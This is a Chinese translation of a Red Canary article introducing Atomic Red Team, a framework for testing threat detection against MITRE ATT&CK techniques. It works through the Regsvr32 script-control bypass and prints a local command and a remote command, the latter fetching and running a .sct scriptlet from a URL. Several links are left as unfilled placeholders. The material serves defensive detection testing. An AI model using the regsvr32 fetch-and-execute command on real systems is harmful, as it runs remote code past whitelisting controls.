# 【技术分享】Atomic Red Team：针对安全设计的新型自动化测试框架

## 译文声明
本文为翻译文章，原文来源于[redcanary.com](https://redcanary.com/)。译文仅供参考，具体内容及含义以原文为准。

## 译者信息
- 译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
- 预估稿费：200 RMB
- 投稿方式：发送邮件至linwei#360.cn 或 登录网页版在线投稿

---

### 一、前言
如何确保已部署的安全解决方案能够应对实际攻击？你是否正在测试新的或现有的安全产品以检测安全威胁？对于许多团队来说，内部资源或专业知识可能不足以模拟特定对手所使用的策略或技术。因此，我们推出了Atomic Red Team。这是一个开源测试框架，旨在评估用户的威胁检测能力。之所以称为“原子”，是因为它可以作为小型组件，方便不同规模的安全团队使用，模拟特定攻击者的活动。

**框架地址：**
（此处添加具体链接）

### 二、意义所在
MITRE团队收集了大量攻击者所使用的策略，并对其进行了分类，提供了关于攻击生命周期中各种情况及策略的参考资料。每个安全人员都应该学习[MITRE ATT&CK Framework](https://attack.mitre.org/wiki/Introduction_and_Overview)，因为它有助于更好地理解当前许多攻击者的能力和策略。

### 三、使用方法
Atomic Red Team是一个小巧且便捷的测试框架，与MITRE ATT&CK Framework相对应。每个测试用例都对应一种特定的攻击策略，帮助安全人员快速测试其安全方案能否应对各种形式的攻击。

**使用步骤如下：**

1. **获取授权**：在进行测试前，请确保已获得必要的授权许可。未经授权的测试可能会对个人记录产生不良影响。
   
2. **搭建测试环境**：设置一个与真实环境相似的测试主机，并确保事件收集及EDR（端点检测及响应）解决方案已准备就绪，端点已登录并处于活跃状态。
   
3. **制定测试计划**：花时间制定详细的测试计划或方案。例如，可以在一个批处理文件中一次性执行所有的探测分支，也可以逐一运行每个分支，并随时验证测试覆盖率。

**操作视频示例：**
（此处添加视频链接）

### 四、测试案例：Regsvr32.exe
在这个例子中，我们将测试[Regsvr32.exe](https://attack.mitre.org/wiki/Technique/T1117)的覆盖率。建议先了解这种攻击方法的相关知识，以便更好地理解测试用例的背景。

**背景信息：**
2016年春季，我发现了一种利用Regsvr32.exe绕过脚本控制策略的方法。这种方法没有对应的补丁，可以轻易绕过大多数安全控制策略。当时的推文如下：
（此处添加推文链接）

### 五、测试阶段
这个测试框架分为三个阶段：

#### 5.1 阶段1：执行测试
该测试用例非常简单，因为所使用的工具在所有Windows工作站上默认安装。

**详细测试用例链接：**
（此处添加链接）

我们提供了两种方法来进行模拟：本地方法和远程方法。此外，还提供了一个“.sct”示例文件，以辅助运行模拟过程。

**1. 本地方法**
对于本地模拟，可以使用以下命令及预先提供的.sct文件：
```shell
regsvr32.exe /s /u /i:file.sct scrobj.dll
```

**2. 远程方法**
对于远程模拟，你需要一个可远程访问的服务器来抓取或下载所需的文件，或者直接使用gist地址：
```shell
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
```

请注意执行测试所需的时间，并跟踪测试时长以测量测试过程的有效性。

#### 5.2 阶段2：收集证据
你的安全解决方案会观察到什么结果？可能会看到用户目录中的文件改动，regsvr32.exe向外部IP地址发起网络连接，代理日志中的相关记录，或者Windows系统加载scrobj.dll等现象。这些正是我们测试的目的所在，通过测试明确可观测结果之间的差异，进一步改善观测结果。

Red Canary使用EDR传感器（如Carbon Black）来提供相关信息，帮助安全人员检测高级攻击行为。经过分析整理，最终检测结果如上图所示。我们会根据这个结果在Carbon Black中回溯与这次检测有关的事件。

**可视化结果：**
从更高层次来看，你可以可视化地观察到攻击的执行流程。可以看到由谁启动了什么程序。这张图对我们的分析过程帮助很大，但还需要查看实际数据。

**数据收集：**
上图中，我们已经收集到攻击所使用的命令以及基本的进程信息。可以从中提取许多属性信息，包括一些命令行参数。

**进一步挖掘：**
我们可以进一步挖掘数据，观察攻击中用来获取载荷的网络连接信息。

#### 5.3 阶段3：开发检测方法
执行测试用例后，如果发现已部署的安全方案未能正常工作，这就是我们进行测试的原因。基于实验结果和现有测试能力，你需要使用掌握的技能，在环境中检测这个攻击事件。

单独抽出这个事件后，可以观察收集的所有属性，分析哪些属性可以用于风险警报。例如，可以在Carbon Black中构建一个关注列表，包含特定的文件路径、exe文件、网络连接特征等。

**验证检测方案：**
检测方案构建完毕后，需要验证其有效性并进行优化。如果检测方案过于宽泛，会导致大量的误报；如果过于狭隘，则攻击者只需稍作修改即可绕过检测。为了找到平衡点，需要重新运行模拟过程，调整检测标准，直至找到合适的平衡点。这需要持续迭代，才能得到较好的结果。

### 六、目标：衡量并改进
我们的目标之一是根据ATT&CK矩阵来衡量我们在覆盖率及功能方面的效果，找到仍需改进的地方。Roberto Rodriguez（@cyb3rWar0g）提供了一份电子表格及补充文档，可以帮助我们参考MITRE ATT&CK矩阵找到所处的具体位置。

利用Atomic Red Team，我们可以在模拟环境中运行这些测试用例，验证检测方案的有效性，也可以验证防御控制方案是否正常工作。这份电子表格提供了丰富的信息，蓝队可以根据这些知识，通过各种方法来检测这类攻击行为。

### 七、总结
通过这篇文章，我们希望你能获得一些灵感或具备一些能力，在自己的环境中模拟各类安全威胁。当然，还有许多情况需要模拟。我们非常欢迎大家提供反馈意见，以进一步改进这个框架。需要注意的是，通过这些测试用例，你无法百分百确保自己能检测并防御实际环境中的攻击行为。然而，这个测试过程可以帮助你查找现有检测流程中存在的不足，改善整体响应结果，使攻击者的行动更加困难。

本文成稿离不开Red Canary团队成员及安全社区的共同协作。期待大家的反馈意见及贡献力量。

如果有任何意见或建议，欢迎联系我们：PI:EMAIL